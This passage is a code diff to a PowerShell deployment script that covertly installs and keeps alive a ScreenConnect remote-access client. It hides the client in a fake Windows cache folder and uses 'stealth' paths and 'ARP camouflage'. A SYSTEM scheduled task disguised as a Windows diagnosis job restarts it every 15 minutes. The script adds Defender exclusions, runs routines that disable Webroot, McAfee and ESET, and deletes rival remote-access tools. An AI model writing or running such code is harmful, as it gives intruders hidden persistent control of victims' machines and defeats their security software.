+    foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)}, $env:ProgramData)) {
+        if (-not $base) { continue }
+        Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object {
+            $_.Name -like "*$Fingerprint*" -or $_.FullName -like "*ScreenConnect*$Fingerprint*"
+        } | ForEach-Object {
+            Write-Log "NUKE dir $($_.FullName)"
+            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+            $n++
+        }
+        $scData = Join-Path $base "ScreenConnect\$Fingerprint"
+        if (Test-Path $scData) {
+            Write-Log "NUKE data $scData"
+            Remove-Item $scData -Recurse -Force -ErrorAction SilentlyContinue
+            $n++
+        }
+    }
+    foreach ($root in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
+            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $p) { return }
+            $b = "$($p.DisplayName) $($p.InstallLocation) $($p.UninstallString)"
+            if ($b -like "*$Fingerprint*" -and -not (Test-IsAllowedSc $b)) {
+                Write-Log "NUKE ARP $($_.PSChildName)"
+                Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
+                $n++
+            }
+        }
+    }
+    return $n
+}
+
+function Invoke-NukeForeignScreenConnect {
+    # ALWAYS run — do not wait for primary. Keep only allowlist FPs.
+    Write-Log 'NUKE-FOREIGN: remove every ScreenConnect FP not in allowlist'
+    Assert-AllowedAlternativesAlive
+    $actions = 0
+    $found = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
+
+    Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -like '*ScreenConnect*' -or $_.DisplayName -like '*ScreenConnect*' -or $_.PathName -like '*ScreenConnect*'
+    } | ForEach-Object {
+        foreach ($fp in (Get-ScFingerprintsFromBlob "$($_.Name) $($_.DisplayName) $($_.PathName)")) {
+            [void]$found.Add($fp)
+        }
+    }
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match '(?i)^ScreenConnect\.'
+    } | ForEach-Object {
+        foreach ($fp in (Get-ScFingerprintsFromBlob "$($_.ExecutablePath) $($_.CommandLine)")) {
+            [void]$found.Add($fp)
+        }
+    }
+    foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)})) {
+        Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object {
+            $_.Name -like 'ScreenConnect*'
+        } | ForEach-Object {
+            foreach ($fp in (Get-ScFingerprintsFromBlob $_.Name)) { [void]$found.Add($fp) }
+        }
+    }
+    foreach ($fp in $LegacyFingerprints) { [void]$found.Add($fp) }
+
+    Write-Log ("NUKE-FOREIGN discovered: {0}" -f (($found | Sort-Object) -join ','))
+    foreach ($fp in @($found)) {
+        if (Test-IsAllowedFingerprint $fp) {
+            Write-Log "NUKE-FOREIGN KEEP $fp"
+            continue
+        }
+        $actions += [int](Remove-ScreenConnectInstance -Fingerprint $fp -Reason 'foreign')
+    }
+    Assert-AllowedAlternativesAlive
+    Write-Log "NUKE-FOREIGN complete actions~$actions"
 }
 
 function Invoke-NukeBlockedRmm {
     if (-not (Test-PrimaryScReady)) {
-        Write-Log 'NUKE SKIPPED: primary SC not ready yet'
+        Write-Log 'NUKE rivals SKIPPED: primary SC not ready yet'
+        Assert-AllowedAlternativesAlive
         return
     }
-    Write-Log 'NUKE: primary ready — removing disallowed SC/RMM'
+    Write-Log 'NUKE: foreign SC again + non-SC rivals'
+    Invoke-NukeForeignScreenConnect
     $actions = 0
 
-    # Legacy fingerprints
-    foreach ($fp in $LegacyFingerprints) {
-        if ($AllowedFingerprints -contains $fp) { continue }
-        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
-            $_.Name -like "*$fp*" -or $_.PathName -like "*$fp*" -or $_.DisplayName -like "*$fp*"
-        } | ForEach-Object {
-            Write-Log "NUKE svc $($_.Name)"
-            & sc.exe stop "$($_.Name)" >$null 2>&1
-            & sc.exe delete "$($_.Name)" >$null 2>&1
-            $actions++
-        }
-        foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)})) {
-            Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object {
-                $_.Name -like "ScreenConnect*$fp*"
-            } | ForEach-Object {
-                Write-Log "NUKE dir $($_.FullName)"
-                Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
-                $actions++
-            }
-        }
-    }
-
-    # ScreenConnect / ConnectWise not in allowlist
-    Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -like '*ScreenConnect*' -or $_.Name -like '*ConnectWise*' -or $_.DisplayName -like '*ScreenConnect*'
-    } | ForEach-Object {
-        $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
-        $blocked = $false
-        foreach ($b in $BlockedRelayHints) { if ($blob -like "*$b*") { $blocked = $true } }
-        if ($blocked -or -not (Test-IsAllowedSc $blob)) {
-            # Never delete primary/allowed
-            if (Test-IsAllowedSc $blob) { return }
-            Write-Log "NUKE unauthorized SC $($_.Name)"
-            & sc.exe stop "$($_.Name)" >$null 2>&1
-            & sc.exe delete "$($_.Name)" >$null 2>&1
-            $actions++
-        }
-    }
-
-    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -match 'ScreenConnect|ClientService'
-    } | ForEach-Object {
-        $blob = "$($_.Name) $($_.ExecutablePath) $($_.CommandLine)"
-        if (Test-IsAllowedSc $blob) { return }
-        # Don't kill our stealth primary by path
-        if ($_.ExecutablePath -like '*\.wucache\scclient*') { return }
-        Write-Log "NUKE proc PID $($_.ProcessId)"
-        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-        $actions++
-    }
-
-    # Non-SC rival RMM tokens
     Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
         $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+        if (Test-IsAllowedSc $blob) { return }
+        if ($blob -match '(?i)ScreenConnect') { return }
         foreach ($tok in $RivalTokens) {
             if ($blob -like "*$tok*") {
-                if (Test-IsAllowedSc $blob) { return }
                 Write-Log "NUKE rival svc $($_.Name) ($tok)"
                 & sc.exe stop "$($_.Name)" >$null 2>&1
                 & sc.exe delete "$($_.Name)" >$null 2>&1
@@ -637,7 +1007,8 @@ function Invoke-NukeBlockedRmm {
         }
     }
 
-    Write-Log "NUKE complete actions~$actions"
+    Assert-AllowedAlternativesAlive
+    Write-Log "NUKE rivals complete actions~$actions"
 }
 
 # ============================================
@@ -646,83 +1017,132 @@ function Invoke-NukeBlockedRmm {
 function Install-EnsureMonitor {
     $mon = Join-Path $WorkDir 'wucache.ps1'
     $pkg = Join-Path $WorkDir 'wucache_pkg.ps1'
-    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-        Copy-Item $PSCommandPath $pkg -Force -ErrorAction SilentlyContinue
+    $run = Join-Path $WorkDir 'run.ps1'
+    $pkgSrc = $null
+    foreach ($cand in @(
+        $PSCommandPath,
+        'C:\Windows\Temp\wucache_pkg.ps1',
+        $pkg
+    )) {
+        if ($cand -and (Test-Path $cand) -and ((Get-Item $cand).Length -gt 1000)) { $pkgSrc = $cand; break }
+    }
+    if ($pkgSrc -and $pkgSrc -ne $pkg) {
+        Copy-Item $pkgSrc $pkg -Force -ErrorAction SilentlyContinue
     }
     $body = @"
 `$ErrorActionPreference='SilentlyContinue'
 `$WorkDir='$WorkDir'
-`$ScDir='$ScDir'
 `$SvcName='$SvcName'
+`$AltSvcName='$AltSvcName'
+`$PrimaryFingerprint='$PrimaryFingerprint'
 `$LogFile=Join-Path `$WorkDir '.diag.log'
 `$pkg=Join-Path `$WorkDir 'wucache_pkg.ps1'
+`$run=Join-Path `$WorkDir 'run.ps1'
 function L(`$m){ try{ Add-Content `$LogFile ("[{0}] mon: {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), `$m) }catch{} }
 L 'tick'
+# ALWAYS keep allowed alt (pluxn) online
+`$alt=Get-Service -Name `$AltSvcName -EA SilentlyContinue
+if(`$alt){
+  sc.exe config ``"`$AltSvcName``" start= auto >`$null 2>&1
+  if(`$alt.Status -ne 'Running'){ L 'alt stopped - start'; sc.exe start ``"`$AltSvcName``" >`$null 2>&1 }
+} else { L 'alt service missing' }
+# Primary: trust service state (Program Files OR stealth) — do NOT require stealth exe
 `$s=Get-Service -Name `$SvcName -EA SilentlyContinue
-`$exe=Join-Path `$ScDir 'ScreenConnect.ClientService.exe'
-if((Test-Path `$exe) -and ((Get-Item `$exe).Length -ge 50000)){
-  if(-not `$s){ L 'service missing - relaunch'; if(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``"" }; return }
-  if(`$s.Status -ne 'Running'){ L 'service stopped - start'; sc.exe start ``"`$SvcName``" >`$null 2>&1 }
-} else {
-  L 'files missing - relaunch'
-  if(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``"" }
-}
+if(`$s -and `$s.Status -eq 'Running'){ L 'primary running - ok'; return }
+if(`$s){ L 'primary stopped - start'; sc.exe start ``"`$SvcName``" >`$null 2>&1; return }
+L 'primary service missing - relaunch'
+if(Test-Path `$run){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$run``"" }
+elseif(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``"" }
 "@
     Set-Content -Path $mon -Value $body -Encoding ASCII -Force
     $task = '\Microsoft\Windows\Diagnosis\Scheduled'
     schtasks.exe /Delete /TN $task /F >$null 2>&1
     $tr = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mon`""
     schtasks.exe /Create /TN $task /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 15 /F /TR "$tr" >$null 2>&1
-    Write-Log 'monitor armed (15m ensure)'
+    Write-Log 'monitor armed (15m ensure + alt protect)'
 }
 
 # ============================================
-# MAIN
+# MAIN — ORDER: protect alt → ensure primary → then nuke
 # ============================================
 Remove-PreviousDeployArtifacts
 Enable-QuietDefenderExclusions
+Assert-AllowedAlternativesAlive
 
-Write-Log 'PHASE 1: AV soft pushback (pre-install)'
-Invoke-WebrootPushback | Out-Null
-Invoke-McAfeePushback | Out-Null
-Invoke-EsetPushback | Out-Null
-
-Write-Log 'PHASE 2: ensure primary SC (zip/stealth) BEFORE any rival nuke'
-$ok = Ensure-PrimarySc -MaxRounds 8
-
-if ($ok) {
-    Write-Log 'PHASE 3: primary ready — full AV nuclear + rival nuke'
-    Invoke-GenericAvPushback
-    # Re-assert SC after AV stop storms
-    Start-PrimaryService | Out-Null
-    if (-not (Test-PrimaryScReady)) {
-        Write-Log 'PHASE 3b: SC dropped after AV — re-ensure'
-        Ensure-PrimarySc -MaxRounds 4 | Out-Null
-    }
-    if (Test-PrimaryScReady) {
-        Invoke-NukeBlockedRmm
-    } else {
-        Write-Log 'PHASE 3: still not ready — SKIP rival nuke'
-    }
+Write-Log 'PHASE 1: ensure PRIMARY ScreenConnect (sevrz) installed+running+healthy FIRST'
+$alreadyOk = (Test-PrimaryScOperational -and -not (Test-PrimaryImagePathJunk))
+if ($alreadyOk) {
+    Write-Log 'PHASE 1 SKIP install: primary already healthy+running'
+    Enable-ScFirewallAllow
+    Set-ArpCamouflage
+    $ok = $true
 } else {
-    Write-Log 'PHASE 3 SKIPPED: primary SC not healthy — will NOT remove rivals'
-    # Last-ditch nuclear WR + zip again
-    Invoke-WebrootNuclear | Out-Null
-    Ensure-PrimarySc -MaxRounds 4 | Out-Null
-    if (Test-PrimaryScReady) {
-        Write-Log 'PHASE 3 recovery OK — now nuking rivals'
-        Invoke-NukeBlockedRmm
+    Write-Log 'PHASE 1b: primary missing/unhealthy — AV soft pushback then install/repair'
+    Invoke-WebrootPushback | Out-Null
+    Invoke-McAfeePushback | Out-Null
+    Invoke-EsetPushback | Out-Null
+    Assert-AllowedAlternativesAlive
+    $ok = Ensure-PrimarySc -MaxRounds 6
+    Assert-AllowedAlternativesAlive
+    if (-not $ok) {
+        Write-Log 'PHASE 1c: still not operational — Webroot nuclear + retry ensure'
+        Invoke-WebrootNuclear | Out-Null
+        Assert-AllowedAlternativesAlive
+        $ok = Ensure-PrimarySc -MaxRounds 4
     }
 }
+Assert-AllowedAlternativesAlive
 
-Install-EnsureMonitor
-Enable-ScFirewallAllow
-Set-ArpCamouflage
+# Re-verify primary before any nuke
+$ok = [bool](Test-PrimaryScOperational)
+Write-Log ("PHASE 1 DONE primary_operational={0}" -f $ok)
 
-$h = Get-ScBinaryHealth
-Write-Log ("FINAL present={0} running={1} svcExe={2} client={3} path={4}" -f `
-    $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $h.ClientExeSize, $ScDir)
-Write-Log ("FINAL ready={0}" -f (Test-PrimaryScReady))
-Write-Log '=== UNIFIED deploy end ==='
+if (-not $ok) {
+    Write-Log 'PHASE 2 SKIPPED: primary NOT ready — will NOT nuke (keep access path)'
+    Install-EnsureMonitor
+    Enable-ScFirewallAllow
+    Assert-AllowedAlternativesAlive
+    $h = Get-ScBinaryHealth
+    $alt = Get-Service -Name $AltSvcName -ErrorAction SilentlyContinue
+    Write-Log ("FINAL present={0} running={1} svcExe={2} operational={3} alt={4}" -f `
+        $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $ok, $(if ($alt) { $alt.Status } else { 'Missing' }))
+    Write-Log '=== UNIFIED deploy end (no nuke) ==='
+    Write-Boot 'ps_done_no_nuke'
+} else {
+    Write-Log 'PHASE 2: primary OK — soft AV then nuke foreign SC + rivals'
+    Invoke-WebrootPushback | Out-Null
+    Invoke-McAfeePushback | Out-Null
+    Invoke-EsetPushback | Out-Null
+    Assert-AllowedAlternativesAlive
+    Start-PrimaryService | Out-Null
+    if (-not (Test-PrimaryScOperational)) {
+        Write-Log 'PHASE 2b: primary dropped after AV — re-ensure before nuke'
+        Ensure-PrimarySc -MaxRounds 3 | Out-Null
+    }
+    Assert-AllowedAlternativesAlive
+
+    if (Test-PrimaryScOperational) {
+        Write-Log 'PHASE 2c: nuke foreign ScreenConnect (allowlist kept)'
+        Invoke-NukeForeignScreenConnect
+        Invoke-NukeBlockedRmm
+    } else {
+        Write-Log 'PHASE 2c SKIPPED: primary lost — no nuke'
+    }
+
+    Install-EnsureMonitor
+    Enable-ScFirewallAllow
+    Set-ArpCamouflage
+    Assert-AllowedAlternativesAlive
+    Start-PrimaryService | Out-Null
+
+    $h = Get-ScBinaryHealth
+    $alt = Get-Service -Name $AltSvcName -ErrorAction SilentlyContinue
+    Write-Log ("FINAL present={0} running={1} svcExe={2} client={3} path={4}" -f `
+        $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $h.ClientExeSize, $ScDir)
+    Write-Log ("FINAL operational={0} relay={1} alt={2}" -f `
+        (Test-PrimaryScOperational), (Test-ScRelayConnected), $(if ($alt) { $alt.Status } else { 'Missing' }))
+    Write-Log '=== UNIFIED deploy end ==='
+    Write-Boot 'ps_done'
+}
 
 try { if ($script:Mutex) { $script:Mutex.ReleaseMutex(); $script:Mutex.Dispose() } } catch {}
